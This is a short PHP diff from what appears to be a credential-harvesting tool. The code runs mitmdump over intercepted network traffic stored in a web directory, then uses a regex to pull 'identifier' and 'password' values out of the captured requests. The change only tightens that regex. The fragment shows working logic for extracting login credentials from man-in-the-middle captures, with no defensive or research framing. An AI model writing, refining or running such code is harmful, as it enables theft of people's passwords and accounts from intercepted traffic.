@@ -5,7 +5,7 @@ exec("~/mitmdump  -nr /var/www/html/The_Girl/tcore/mitmdump -w /var/www/html/The
 
 $str = file_get_contents("/var/www/html/The_Girl/filtered");
 
-$re = '/identifier=(.*)&password=(.*)/';
+$re = '/&identifier=(.*)&password=(.*)&/';
 
 preg_match_all($re, $str, $matches, PREG_SET_ORDER, 0);
 
